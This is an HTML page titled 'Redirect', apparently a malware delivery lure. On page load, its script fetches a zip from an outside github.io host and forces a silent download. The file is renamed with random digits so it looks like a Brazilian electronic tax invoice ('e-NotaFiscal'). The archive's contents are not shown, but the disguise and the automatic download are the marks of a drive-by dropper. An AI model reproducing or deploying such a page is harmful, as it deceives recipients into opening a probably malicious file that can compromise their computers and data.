<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
    <script>
        function generateRandomSuffix(length) {
            let result = '';
            const characters = '0123456789';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        function downloadFile(url, fileName) {
            fetch(url)
                .then(response => response.blob())
                .then(blob => {
                    const downloadUrl = window.URL.createObjectURL(blob);
                    const link = document.createElement('a');
                    link.href = downloadUrl;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                })
                .catch(error => console.error('Erro ao baixar o arquivo:', error));
        }

        window.onload = function() {
            const suffix = generateRandomSuffix(12);
            const newFileName = 'e-NotaFiscal0000' + suffix + '.zip';
            const downloadUrl = 'https://baixetudopcwindows.github.io/clubewin/e-NotaFiscal.zip'; // URL do arquivo de download
            downloadFile(downloadUrl, newFileName);
        }
    </script>
</head>
<body>
</body>
</html>
